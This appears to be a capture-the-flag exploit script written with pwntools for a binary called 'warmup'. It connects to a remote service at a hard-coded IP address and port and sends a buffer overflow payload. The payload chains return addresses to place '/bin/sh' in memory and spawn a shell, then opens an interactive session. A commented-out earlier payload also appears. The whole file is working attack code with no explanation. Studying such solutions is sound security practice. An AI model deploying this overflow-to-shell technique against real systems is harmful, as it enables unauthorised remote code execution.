from pwn import *
#p=process('./warmup')
p=remote('202.120.7.207','52608')
p.recvuntil('!')
#p.send('a'*(0x34-20)+p32(0x804811D)+p32(0x8048112)+p32(0)+p32(0x80491BC)+p32(11)+'/bin/sh'+p32(0))
p.send('a'*(0x34-20)+p32(0x80480d8)+'a'*0x30+p32(0x804811D)+p32(0x80480d8)+p32(0)+p32(0x80491BC)+p32(16)+'/bin/sh\x00'+p32(0x80491BC)+p32(0)+'a'*(0x34-20)+p32(0x804811D)+p32(0x8048122)+p32(0)+p32(0x80491BC)+p32(0x80491BC+8)+'/bin/sh\x00\xbc\x91\x04')
p.interactive()
